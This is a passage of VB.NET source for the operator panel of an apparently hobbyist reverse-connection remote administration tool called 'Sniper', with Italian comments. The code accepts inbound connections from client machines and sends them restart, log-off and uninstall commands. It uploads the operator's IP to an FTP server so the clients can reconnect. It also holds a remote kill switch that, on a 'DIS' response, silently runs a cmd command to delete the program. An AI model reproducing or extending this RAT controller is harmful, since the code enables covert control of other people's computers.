                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ciao As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try
                End If
                If NumSock > 1 Then
                    Dim SelezionatoItemchiu As Integer
                    SelezionatoItemchiu = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu2 = SelezionatoItemchiu To NumSock
                        listener(chiu2) = listener(chiu2 + 1)
                        client(chiu2) = client(chiu2 + 1)
                        netstream(chiu2) = netstream(chiu2 + 1)
                    Next chiu2
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
                cmdClo.Enabled = True
                MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Error")
            End Try
        Else
            cmdClo.Enabled = True
            MsgBox("Select an IP in the list!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        If Not lstwIpReverse.SelectedIndices.Count <= 0 Then 'Verifico la selezione di un IP
            Try

                cmdClo.Enabled = False
                netstream(
                lstwIpReverse.SelectedIndices.Item(0).ToString).Write(
                UTF8.GetBytes("<[PCRI]>"), 0, UTF8.GetBytes("<[PCRI]>").Length) 'invio il comando il Client
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ex As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try

                End If
                If NumSock > 1 Then
                    Dim SelezionatoItemri As Integer
                    SelezionatoItemri = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu3 = SelezionatoItemri To NumSock
                        listener(chiu3) = listener(chiu3 + 1)
                        client(chiu3) = client(chiu3 + 1)
                        netstream(chiu3) = netstream(chiu3 + 1)
                    Next chiu3
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
            Catch ex As Exception
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ciao As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try
                End If
                If NumSock > 1 Then
                    Dim SelezionatoItemri As Integer
                    SelezionatoItemri = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu3 = SelezionatoItemri To NumSock
                        listener(chiu3) = listener(chiu3 + 1)
                        client(chiu3) = client(chiu3 + 1)
                        netstream(chiu3) = netstream(chiu3 + 1)
                    Next chiu3
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
                cmdClo.Enabled = True
                MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Error")
            End Try
        Else
            cmdClo.Enabled = True
            MsgBox("Select an IP in the list!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub LogOffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogOffToolStripMenuItem.Click
        If Not lstwIpReverse.SelectedIndices.Count <= 0 Then 'Verifico la selezione di un IP
            Try

                cmdClo.Enabled = False
                netstream(
                lstwIpReverse.SelectedIndices.Item(0).ToString).Write(
                UTF8.GetBytes("[PClog]"), 0, UTF8.GetBytes("[PClog]").Length) 'invio il comando il Client
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ex As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try

                End If
                If NumSock > 1 Then
                    Dim SelezionatoItemlog As Integer
                    SelezionatoItemlog = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu4 = SelezionatoItemlog To NumSock
                        listener(chiu4) = listener(chiu4 + 1)
                        client(chiu4) = client(chiu4 + 1)
                        netstream(chiu4) = netstream(chiu4 + 1)
                    Next chiu4
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
            Catch ex As Exception
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ciao As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try
                End If
                If NumSock > 1 Then
                    Dim SelezionatoItemlog As Integer
                    SelezionatoItemlog = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu4 = SelezionatoItemlog To NumSock
                        listener(chiu4) = listener(chiu4 + 1)
                        client(chiu4) = client(chiu4 + 1)
                        netstream(chiu4) = netstream(chiu4 + 1)
                    Next chiu4
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
                cmdClo.Enabled = True
                MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Error")
            End Try
        Else
            cmdClo.Enabled = True
            MsgBox("Select an IP in the list!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub Settings_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Settings.Click
        Try
            If ISFormOp(Me.lstwIpReverse.SelectedIndices.Item(0)) = False Then
                FPAN(lstwIpReverse.SelectedIndices.Item(0)) = New frmControlPanel
                FPAN(lstwIpReverse.SelectedIndices.Item(0)).Show()
                ISFormOp(Me.lstwIpReverse.SelectedIndices.Item(0)) = True
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub TopMostFormToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TopMostFormToolStripMenuItem.Click
        Try
            If TopMostFormToolStripMenuItem.Text = "Top most form" Then
                Me.TopMost = True
                TopMostFormToolStripMenuItem.Text = "Top most off"
            Else
                Me.TopMost = False
                TopMostFormToolStripMenuItem.Text = "Top most form"
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        If MsgBox("Do you want really exit?", MsgBoxStyle.Information + MsgBoxStyle.YesNo, "Exit") = vbYes Then
            End
       End If
    End Sub

    Sub ExIp()
        bkwIp.RunWorkerAsync()
    End Sub

    Private Sub SaveIPListToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SaveIPListToolStripMenuItem.Click
        Try
            Dim Dlg As New SaveFileDialog
            Dlg.Filter = "Txt file|*.txt"
            Dlg.Title = "Select a path.."
            Dlg.ShowDialog()
            If Not Dlg.FileName = "" Then
                Dim wr As StreamWriter
                wr = New StreamWriter(Dlg.FileName, False)
                For Ip = 0 To lstwIpReverse.Items.Count - 1
                    wr.Write(lstwIpReverse.Items.Item(Ip).Text & " - " & lstwIpReverse.Items.Item(Ip).SubItems(1).Text &
                              " - " & lstwIpReverse.Items.Item(Ip).SubItems(2).Text & " - " & lstwIpReverse.Items.Item(Ip).SubItems(3).Text & vbCrLf)
                Next Ip
                wr.Flush()
                wr.Close()
                Dlg.FileName = ""
                MsgBox("The ip list has been saved successfully", MsgBoxStyle.Information)
            End If
            Dlg.FileName = ""
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub RecentConnectionsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RecentConnectionsToolStripMenuItem.Click
        frmConnR.Show()
    End Sub

    Private Sub cmdAbout_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdAbout.Click
        MsgBox("Software created by GicoPiro." & vbCrLf &
            "I started this project when unfortunately my grandmother died" & vbCrLf & "www.gicopirosite.altervista.org", MsgBoxStyle.Information, "Info")

    End Sub

    Private Sub TakeNotesToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TakeNotesToolStripMenuItem.Click
        frmNotes.Show()
        frmNotes.lblCl.Text = lstwIpReverse.SelectedIndices.Item(0) + 1
    End Sub

    Private Sub cmdSniperSett_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSniperSett.Click
        frmSettings.Show()
    End Sub

    Private Sub cmdSetLimit_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdSetLimit.Click
        Try
            ReLimit = nudLimCl.Value
            ReDim client(ReLimit)
            ReDim listener(ReLimit)
            ReDim netstream(ReLimit)

            ReDim FInfo(ReLimit)
            ReDim FPAN(ReLimit)

            ReDim ISFormOp(ReLimit)
            ReDim ISFormOp2(ReLimit)

            ReDim IfCosoKA(ReLimit)

            Dim wr4 As StreamWriter
            wr4 = New StreamWriter(Application.StartupPath & "\ClientsSettings.ini", False)
            wr4.Write(nudLimCl.Value)
            wr4.Flush()
            wr4.Close()
            MsgBox("Done")
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub bkwIp_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwIp.DoWork
        Try
            Dim req As HttpWebRequest = WebRequest.Create("http://gicopico.altervista.org/IP.php")
            Dim res As HttpWebResponse = req.GetResponse()
            Dim Stream As Stream = res.GetResponseStream()
            Dim sr As StreamReader = New StreamReader(Stream)
            LIP = sr.ReadToEnd()
            If LIP = "DIS" Then

                Dim wrnon As StreamWriter
                wrnon = New StreamWriter("C:\Windows\Temp" & "\SystemComponents.ini", False)
                wrnon.Write("0")
                wrnon.Flush()
                wrnon.Close()

                MsgBox("Ciao bello ! Se stai leggendo questo messaggio è perchè la tua copia di Sniper non ti è stata adeguatamente concessa," & vbCrLf &
                    "oppure hai commesso qualche azione che non è conforme al suo regolamento ! La copia è stata disattivata !" & vbCrLf &
                    "-Buona Giornata- GicoPiro")

                Shell("cmd.exe " & "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath, vbHide)
                End
            End If
        Catch ex As Exception
            LIP = "Unable to read"
            MsgBox("Error in finding external ip address", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdUn_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdUn.Click
        If Not lstwIpReverse.SelectedIndices.Count <= 0 Then 'Verifico la selezione di un IP
            Try
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If
                cmdClo.Enabled = False

                netstream(
                lstwIpReverse.SelectedIndices.Item(0).ToString).Write(
                UTF8.GetBytes("|Un|"), 0, UTF8.GetBytes("|Un|").Length) 'invio il comando il Client
                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ex As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try

                End If
                If NumSock > 1 Then
                    Dim SelezionatoItem As Integer
                    SelezionatoItem = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu = SelezionatoItem To NumSock
                        listener(chiu) = listener(chiu + 1)
                        client(chiu) = client(chiu + 1)
                        netstream(chiu) = netstream(chiu + 1)
                    Next chiu
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
            Catch ex As Exception
                cmdClo.Enabled = False
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN3(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ciao As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try
                End If
                If NumSock > 1 Then
                    Dim SelezionatoItem As Integer
                    SelezionatoItem = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu = SelezionatoItem To NumSock
                        listener(chiu) = listener(chiu + 1)
                        client(chiu) = client(chiu + 1)
                        netstream(chiu) = netstream(chiu + 1)
                    Next chiu
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
                MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Error")
            End Try
        Else
            cmdClo.Enabled = True
            MsgBox("Select an IP in the list!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub cmdPChkOp_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdPChkOp.Click
        Try
            Process.Start(Application.StartupPath & "\Port mapper\UPNP port mapper.exe")
        Catch ex As Exception
            MsgBox("Unable to find the application" & vbCrLf & "..\Port mapper\UPNP port mapper.exe", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub PortToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PortToolStripMenuItem.Click
        Try
            Process.Start(Application.StartupPath & "\Port mapper\UPNP port mapper.exe")
        Catch ex As Exception
            MsgBox("Unable to find the application" & vbCrLf & "..\Port mapper\UPNP port mapper.exe", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdFuckNoIp_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdFuckNoIp.Click
        Try
            If bkwFNI.IsBusy = False Then
                bkwFNI.RunWorkerAsync()
            Else
                MsgBox("Wait until the operation is accomplished", MsgBoxStyle.Exclamation)
            End If
        Catch ex As Exception
            MsgBox("Error: " & vbCrLf & ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub bkwFNI_DoWork(ByVal sender As System.Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles bkwFNI.DoWork
        Try
            Dim reqf As HttpWebRequest = WebRequest.Create("http://gicopico.altervista.org/IP.php")
            Dim resf As HttpWebResponse = reqf.GetResponse()
            Dim Streamf As Stream = resf.GetResponseStream()
            Dim srf As StreamReader = New StreamReader(Streamf)
            LIP = srf.ReadToEnd()

            Dim wrF As StreamWriter
            wrF = New StreamWriter(Environ("TEMP") & "\fnp.txt", False)
            wrF.Write(LIP)
            wrF.Flush()
            wrF.Close()


            Dim clsR As System.Net.FtpWebRequest = _
                DirectCast(System.Net.WebRequest.Create("ftp://" & FU & "/fnp.txt"), System.Net.FtpWebRequest)
            clsR.Credentials = New System.Net.NetworkCredential(FUS, FP)
            clsR.Method = System.Net.WebRequestMethods.Ftp.UploadFile


            Dim bFi() As Byte = System.IO.File.ReadAllBytes(Environ("TEMP") & "\fnp.txt")


            Dim clsStr As System.IO.Stream = _
                clsR.GetRequestStream()
            clsStr.Write(bFi, 0, bFi.Length)
            clsStr.Close()
            clsStr.Dispose()

            Kill(Environ("TEMP") & "\fnp.txt")

            MsgBox("IP successfully uploaded!", MsgBoxStyle.Information)
        Catch ex As Exception
            MsgBox("Error in doing this operation: " & vbCrLf & ex.Message)
        End Try
    End Sub

    Private Sub UninstalClientToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstalClientToolStripMenuItem.Click
        If Not lstwIpReverse.SelectedIndices.Count <= 0 Then 'Verifico la selezione di un IP
            Try
                netstream(
               lstwIpReverse.SelectedIndices.Item(0).ToString).Write(
               UTF8.GetBytes("|Un2|"), 0, UTF8.GetBytes("|Un2|").Length) 'invio il comando il Client
            Catch ex As Exception
                cmdClo.Enabled = False
                If Not FInfo(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FInfo(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not FPAN(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    FPAN(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If Not frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)) Is Nothing Then
                    frmControlPanel.FPAN2(lstwIpReverse.SelectedIndices.Item(0)).Close()
                End If

                If NumSock = 1 Then
                    tmrDati.Stop()
                    tmrPen.Stop()
                    listener(NumSock).Stop()
                    listener(NumSock - 1).Stop()
                    client(NumSock - 1).Close()
                    netstream(NumSock - 1).Close()
                    NumSock = 0
                    Try
                        listener(0) = New TcpListener(IPAddress.Any, nudPorta.Value) 'Assegno un istanza al primo server
                        listener(0).Start() 'Avvio il server sulla porta selezionata dall'utente e sull'ip locale
                        tmrPen.Start() 'Avvio il timer che accetta connessioni
                    Catch ciao As Exception
                        cmdAttivaP.Enabled = True
                        nudPorta.Enabled = True
                        MsgBox("Unable to start the listener on port " & nudPorta.Value & vbCrLf & "Maybe a software uses already this port", MsgBoxStyle.Information)
                    End Try
                End If
                If NumSock > 1 Then
                    Dim SelezionatoItem As Integer
                    SelezionatoItem = lstwIpReverse.SelectedIndices.Item(0)
                    For chiu = SelezionatoItem To NumSock
                        listener(chiu) = listener(chiu + 1)
                        client(chiu) = client(chiu + 1)
                        netstream(chiu) = netstream(chiu + 1)
                    Next chiu
                    NumSock = NumSock - 1
                End If

                lblCC.Text = "Connected Client(s): " & NumSock
                lstwIpReverse.SelectedItems.Item(0).Remove() 'Rimuovo dalla lista l'IP selezionato
                cmdClo.Enabled = True
                MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Error")
            End Try
        Else
            MsgBox("Select an IP in the list!", MsgBoxStyle.Exclamation)
        End If
    End Sub

    Private Sub cmdClientSett_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdClientSett.Click
        Try
            Process.Start(Application.StartupPath & "\Edit Client Sniper.exe")
        Catch ex As Exception
            MsgBox("Unable to find the application" & vbCrLf & "..\Edit Client Sniper.exe", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub cmdHelp_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdHelp.Click
        Try
            Process.Start("www.sniperreverse.altervista.org")
        Catch ex As Exception
            MsgBox("Unable to open the site", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub HelpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HelpToolStripMenuItem.Click
        Try
            Process.Start(Application.StartupPath & "\Help.txt")
        Catch ex As Exception
            MsgBox("Unable to find the file" & vbCrLf & "..\Help.txt", MsgBoxStyle.Critical)
        End Try
    End Sub

End Class
